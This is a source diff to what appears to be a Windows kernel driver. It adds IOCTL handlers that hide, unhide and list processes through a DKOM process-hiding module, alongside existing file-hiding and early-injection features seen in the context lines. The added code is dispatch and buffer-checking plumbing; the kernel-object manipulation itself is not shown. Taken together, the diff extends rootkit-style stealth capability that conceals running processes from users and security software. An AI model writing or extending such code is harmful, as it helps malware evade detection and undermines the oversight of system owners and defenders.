@@ -4,6 +4,7 @@
 #include "Hypervisor/HvProtection.h"
 #include "../Injection/EarlyInjection.h"
 #include "../FileHide/FileHide.h"
+#include "../DKOM/ProcessHide.h"
 
 // Forward declaration for HandleCopyMemory
 NTSTATUS HandleCopyMemory(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info);
@@ -245,6 +246,19 @@ NTSTATUS DioProcessDeviceControl(PDEVICE_OBJECT, PIRP Irp)
 
 	case IOCTL_DIOPROCESS_FILEHIDE_LIST:
 		status = HandleFileHideList(Irp, irpSp, &info);
+		break;
+
+	// DKOM Process Hiding IOCTLs
+	case IOCTL_DIOPROCESS_PROCESS_HIDE:
+		status = HandleProcessHide(Irp, irpSp);
+		break;
+
+	case IOCTL_DIOPROCESS_PROCESS_UNHIDE:
+		status = HandleProcessUnhide(Irp, irpSp);
+		break;
+
+	case IOCTL_DIOPROCESS_PROCESS_HIDE_LIST:
+		status = HandleProcessHideList(Irp, irpSp, &info);
 		break;
 
 	default:
@@ -3481,6 +3495,56 @@ NTSTATUS HandleFileHideList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
 	if (NT_SUCCESS(status))
 	{
 		*info = sizeof(FileHideListResponse);
+	}
+
+	return status;
+}
+
+// ============== DKOM Process Hiding Handlers ==============
+
+NTSTATUS HandleProcessHide(PIRP Irp, PIO_STACK_LOCATION irpSp)
+{
+	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
+	if (inputLen < sizeof(TargetProcessRequest))
+		return STATUS_BUFFER_TOO_SMALL;
+
+	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
+	if (!request)
+		return STATUS_INVALID_PARAMETER;
+
+	return ProcessHide_Hide(request->ProcessId);
+}
+
+NTSTATUS HandleProcessUnhide(PIRP Irp, PIO_STACK_LOCATION irpSp)
+{
+	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
+	if (inputLen < sizeof(TargetProcessRequest))
+		return STATUS_BUFFER_TOO_SMALL;
+
+	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
+	if (!request)
+		return STATUS_INVALID_PARAMETER;
+
+	return ProcessHide_Unhide(request->ProcessId);
+}
+
+NTSTATUS HandleProcessHideList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
+{
+	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
+	if (outputLen < sizeof(ProcessHideListResponse))
+		return STATUS_BUFFER_TOO_SMALL;
+
+	auto response = (ProcessHideListResponse*)Irp->AssociatedIrp.SystemBuffer;
+	if (!response)
+		return STATUS_INVALID_PARAMETER;
+
+	RtlZeroMemory(response, sizeof(ProcessHideListResponse));
+
+	NTSTATUS status = ProcessHide_List(response->Entries, &response->Count, MAX_DKOM_HIDDEN_PROCESSES);
+
+	if (NT_SUCCESS(status))
+	{
+		*info = sizeof(ProcessHideListResponse);
 	}
 
 	return status;
